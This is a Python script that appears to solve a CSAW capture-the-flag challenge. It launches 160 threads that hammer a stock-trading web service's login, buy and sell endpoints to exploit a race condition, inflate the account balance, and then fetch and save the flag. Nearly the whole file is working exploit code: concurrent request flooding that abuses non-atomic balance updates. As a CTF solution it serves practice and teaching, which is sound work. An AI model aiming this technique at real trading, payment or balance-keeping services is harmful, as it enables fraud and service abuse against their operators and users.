import requests
import threading
import time
import random

url_base = "http://android-dropper.csaw.io:4657"
userkey = "ultraraceuser666"
stocks = [
    "AAPLISH", "AMAZING", "BROOKING", "BURPSHARKHAT", "CRUISEBOOK",
    "ELONX", "FACEFLOP", "GOOBER", "SNAPSTAR", "SPOTLITE", "TWEETIFY", "ZUCKTECH"
]
num_threads = 160
print_interval = 2

def buy_sell_loop():
    sess = requests.Session()
    for _ in range(3):
        try:
            login = sess.post(url_base+"/login", data={'key': userkey})
        except Exception:
            continue
        # Randomize stock to help break race logic
        my_stock = random.choice(stocks)
        for _ in range(6):
            # Try to buy repeatedly
            sess.post(url_base+"/buy", data={'key': userkey, 'stock': my_stock})
        for _ in range(6):
            # Try to sell all stocks repeatedly
            for s in stocks:
                sess.post(url_base+"/sell", data={'key': userkey, 'stock': s})
        time.sleep(random.uniform(0.0005, 0.003))  # Finer grained timing

def check_flag():
    sess = requests.Session()
    r = sess.post(url_base+"/flag", data={'key': userkey})
    if 'csawctf{' in r.text:
        print("[+] FLAG RETRIEVED!", r.text)
        with open("/home/ctfplayer/ctf_files/flag.txt", 'w') as fp:
            fp.write(r.text.strip())
        return True
    return False

def get_balance():
    sess = requests.Session()
    r = sess.post(url_base+"/login", data={'key': userkey})
    try:
        return float(r.json().get('balance', 0.0))
    except Exception:
        return 0.0

threads = []
flag_found = threading.Event()

def race_worker():
    for _ in range(30):
        if flag_found.is_set():
            return
        buy_sell_loop()
        if get_balance() > 9000:
            print("[+] HIGH BALANCE: ", get_balance())
            if check_flag():
                flag_found.set()
                break

def print_bal():
    while not flag_found.is_set():
        print("[*] Current balance:", get_balance())
        time.sleep(print_interval)

# Launch racing threads
for _ in range(num_threads):
    t = threading.Thread(target=race_worker)
    t.daemon = True
    t.start()
    threads.append(t)

printer = threading.Thread(target=print_bal)
printer.daemon = True
printer.start()

for t in threads:
    t.join(timeout=150)
# Last check for flag if race ends
check_flag()

